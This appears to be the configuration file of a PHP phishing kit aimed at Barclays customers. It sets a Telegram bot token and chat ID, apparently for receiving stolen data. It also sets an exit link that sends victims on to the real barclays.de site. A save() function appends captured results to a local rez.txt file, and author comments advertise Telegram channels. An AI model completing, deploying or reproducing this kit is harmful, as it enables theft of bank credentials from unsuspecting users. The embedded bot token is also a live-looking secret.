<?php
// This example page was made by @j33h4n
// Don't use this example in any illegal use!
// Telegram me: https://t.me/j33h4n
// Join my channel: https://t.me/+Fh3FAJBUw680YTE8

$bot = "7098111044:AAFyJqNFEN-1hl6WdjlZojVcvhdtEPPzJYc";
$id = "-1002147410151";

// exit link
$exit = "https://www.barclays.de/";


function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}




?>